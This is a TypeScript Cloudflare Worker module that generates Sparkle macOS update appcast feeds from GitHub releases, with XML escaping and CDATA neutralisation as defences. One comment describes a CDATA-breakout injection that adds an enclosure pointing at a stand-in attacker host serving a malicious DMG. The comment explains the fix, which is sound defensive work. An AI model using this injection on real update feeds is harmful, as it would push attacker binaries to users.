/// <reference types="@cloudflare/workers-types" />

/**
 * Sparkle appcast generation.
 *
 * The first product baked appcast.xml at build time with Sparkle's `generate_appcast`.
 * Here the Worker GENERATES it on the fly from GitHub release + asset metadata so any product
 * gets a feed for free. The mandatory `sparkle:edSignature` is NOT recomputed (the
 * Worker never holds the private key) — it is read from a sibling `<dmg>.sig` asset
 * that the release pipeline uploads alongside the DMG, exactly as Sparkle expects.
 * The `sparkle:version` (build) and `sparkle:shortVersionString` come from the tag.
 *
 * Output is deterministic given its inputs (no `Date.now()`), so it snapshot-tests.
 */

import type { Release, ReleaseAsset } from "../release/github.js";
import { versionFromTag } from "../release/channels.js";

export { versionFromTag } from "../release/channels.js";

export interface AppcastItemInput {
  /** Human title, e.g. `djdl 1.2.3`. */
  title: string;
  /** Marketing version string (CFBundleShortVersionString), e.g. `1.2.3`. */
  shortVersion: string;
  /** Build version (CFBundleVersion); falls back to shortVersion when unknown. */
  build: string;
  /** Full enclosure URL the updater downloads (points back at this gateway). */
  url: string;
  /** Enclosure byte length. */
  length: number;
  /** RFC-1123 pubDate string (already formatted; kept explicit for determinism). */
  pubDate: string;
  /** Base64 EdDSA signature from the sibling `.sig` asset. Omitted when no sidecar exists,
   *  in which case the enclosure renders WITHOUT a `sparkle:edSignature` attribute. */
  edSignature?: string;
  /** Optional minimum macOS version (sparkle:minimumSystemVersion). */
  minimumSystemVersion?: string;
  /** Optional HTML release notes embedded as the item <description>. */
  descriptionHtml?: string;
}

export interface AppcastInput {
  /** Channel feed title, e.g. `djdl` or `djdl (beta)`. */
  channelTitle: string;
  /** Feed link (the product site / origin). */
  link: string;
  items: AppcastItemInput[];
}

const XML_ESCAPES: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&apos;",
};

function xmlEscape(s: string): string {
  return s.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
}

/**
 * Neutralise a CDATA terminator (R6-13 / R9-08).
 *
 * A `<![CDATA[…]]>` section ends at the FIRST `]]>` in its content, so a release note containing
 * one closes the section early and everything after it is parsed as sibling XML — including a
 * second `<enclosure url="https://attacker.example/evil.dmg" />`, which is an updater pointed at
 * an attacker's binary. The standard escape splits the sequence across two sections: `]]` ends
 * the first, `]]>` re-opens with `<![CDATA[`, and the `>` lands as ordinary character data. The
 * text a client sees is byte-identical; the parse is not.
 *
 * This was Info-rated only because `descriptionHtml` had no producer. P2.T4 gives it one, so the
 * fix lands in the same change.
 */
function neutralizeCdata(s: string): string {
  return s.split("]]>").join("]]]]><![CDATA[>");
}

/**
 * Render prose as the HTML the `<description>` element expects.
 *
 * `extractSummary` returns markdown-stripped PROSE, and `stripMarkdown` is explicitly not an
 * HTML sanitiser — it removes emphasis and link syntax and leaves raw HTML intact (R6-13). So
 * the summary is escaped rather than trusted: a release note that contains `<script>` arrives in
 * the feed as the four characters `&lt;s`… and renders as text in Sparkle's release-notes view.
 * That is the layer above `neutralizeCdata`, which stops the XML breakout; this one stops the
 * markup that would otherwise survive it.
 */
export function proseToHtml(text: string): string {
  return text.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
}

/** Render one `<item>`. The DMG enclosure carries the Sparkle EdDSA attributes. */
function renderItem(item: AppcastItemInput): string {
  const minSys = item.minimumSystemVersion
    ? `\n      <sparkle:minimumSystemVersion>${xmlEscape(item.minimumSystemVersion)}</sparkle:minimumSystemVersion>`
    : "";
  const desc = item.descriptionHtml
    ? `\n      <description><![CDATA[${neutralizeCdata(item.descriptionHtml)}]]></description>`
    : "";
  // When the pipeline didn't publish a sibling `.sig`, omit the attribute rather than 404 —
  // the feed is still valid; Sparkle clients that require signing simply won't auto-update.
  const ed = item.edSignature
    ? ` sparkle:edSignature="${xmlEscape(item.edSignature)}"`
    : "";
  return `    <item>
      <title>${xmlEscape(item.title)}</title>
      <pubDate>${xmlEscape(item.pubDate)}</pubDate>
      <sparkle:version>${xmlEscape(item.build)}</sparkle:version>
      <sparkle:shortVersionString>${xmlEscape(item.shortVersion)}</sparkle:shortVersionString>${minSys}${desc}
      <enclosure url="${xmlEscape(item.url)}" type="application/octet-stream" length="${item.length}"${ed} />
    </item>`;
}

/** Render the full appcast document. Deterministic given its inputs. */
export function renderAppcast(input: AppcastInput): string {
  const items = input.items.map(renderItem).join("\n");
  return `<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>${xmlEscape(input.channelTitle)}</title>
    <link>${xmlEscape(input.link)}</link>
${items}
  </channel>
</rss>
`;
}

/** Format an ISO timestamp (or null) to an RFC-1123 pubDate. Falls back to epoch. */
function rfc1123(iso: string | null): string {
  const d = iso ? new Date(iso) : new Date(0);
  return d.toUTCString();
}

/**
 * Build the appcast item input for a release + its DMG asset, reading the EdDSA
 * signature the caller already fetched from the sibling `.sig` asset. The enclosure
 * `url` is supplied by the caller (it points back through this gateway).
 */
export function buildAppcastItem(
  release: Release,
  dmg: ReleaseAsset,
  edSignature: string | null | undefined,
  enclosureUrl: string,
  opts: {
    title?: string;
    minimumSystemVersion?: string;
    descriptionHtml?: string;
  } = {},
): AppcastItemInput {
  const shortVersion = versionFromTag(release.tag_name);
  return {
    title: opts.title ?? `${shortVersion}`,
    shortVersion,
    build: shortVersion,
    url: enclosureUrl,
    length: dmg.size,
    pubDate: rfc1123(release.published_at),
    ...(edSignature ? { edSignature } : {}),
    ...(opts.minimumSystemVersion
      ? { minimumSystemVersion: opts.minimumSystemVersion }
      : {}),
    ...(opts.descriptionHtml ? { descriptionHtml: opts.descriptionHtml } : {}),
  };
}
